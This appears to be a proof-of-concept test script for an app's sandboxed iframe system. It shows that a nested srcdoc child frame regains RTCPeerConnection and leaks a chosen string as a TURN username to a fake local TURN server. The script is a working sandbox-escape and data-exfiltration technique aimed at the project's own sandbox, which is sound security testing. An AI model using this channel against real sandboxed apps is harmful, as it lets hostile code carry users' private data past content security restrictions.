// Proves a srcdoc child frame inside the sealed area frame regains RTCPeerConnection and leaks a TURN username
// (answering the Allocate with a 401 like a real TURN server would).
import http from 'node:http';
import dgram from 'node:dgram';
import { createRequire } from 'node:module';
const require = createRequire('/home/uni/Code/uni-app-contract/package.json');
const { chromium } = require('@playwright/test');
const { buildSrcdoc: __b } = await import('../../src/interface/srcdoc.ts'); const { FRAME_KIT } = await import('../../src/interface/kits/frameKit.ts'); const buildSrcdoc = (h) => __b(h, { kitSource: FRAME_KIT, headExtra: '' });
let hostBody='';
http.createServer((q,r)=>{r.writeHead(200,{'content-type':'text/html','content-security-policy':'frame-src about:'});r.end(hostBody)}).listen(1457);
const udp = dgram.createSocket('udp4'); const got=[];
const attr=(t,v)=>{const b=Buffer.from(v);const pad=(4-b.length%4)%4;const h=Buffer.alloc(4);h.writeUInt16BE(t,0);h.writeUInt16BE(b.length,2);return Buffer.concat([h,b,Buffer.alloc(pad)])};
udp.on('message',(m,rin)=>{ got.push(m.toString('latin1').replace(/[^\x20-\x7e]/g,'.')); if(m.length<20)return; const txid=m.subarray(8,20);
  const err=Buffer.concat([Buffer.from([0,0,4,1]),Buffer.from('Unauthorized')]);
  const body=Buffer.concat([attr(0x0009,err),attr(0x0014,'evil'),attr(0x0015,'nonce1234567890')]);
  const h=Buffer.alloc(20);h.writeUInt16BE(0x0113,0);h.writeUInt16BE(body.length,2);h.writeUInt32BE(0x2112A442,4);txid.copy(h,8);
  udp.send(Buffer.concat([h,body]),rin.port,rin.address)});
udp.bind(1458,'127.0.0.1');
const app = `<body><script>
// the app's own realm is neutralised; a srcdoc child is not
var f=document.createElement('iframe');f.srcdoc='<script>var pc=new RTCPeerConnection({iceServers:[{urls:"turn:127.0.0.1:1458",username:"AARONS-PRIVATE-ROOM-MESSAGE",credential:"x"}]});pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})<\\/script>';document.body.appendChild(f);
document.title = 'main realm RTC: ' + typeof RTCPeerConnection;
</script>`;
hostBody = `<!doctype html><body><iframe sandbox="allow-scripts" id=f></iframe><script>document.getElementById('f').srcdoc=${JSON.stringify(buildSrcdoc(app)).replace(/</g,"\\u003c")}</script>`;
const b = await chromium.launch(); const p = await b.newPage(); p.on('console',m=>console.log('console:',m.text())); p.on('pageerror',e=>console.log('pageerror:',e.message));
await p.goto('http://127.0.0.1:1457/'); await p.waitForTimeout(4000);
console.log('datagrams:', got.length); console.log('username arrived:', got.some(x=>x.includes('AARONS-PRIVATE-ROOM-MESSAGE')));
console.log(got.filter(x=>x.includes('AARONS')).slice(0,1)[0]);
await b.close(); process.exit(0);
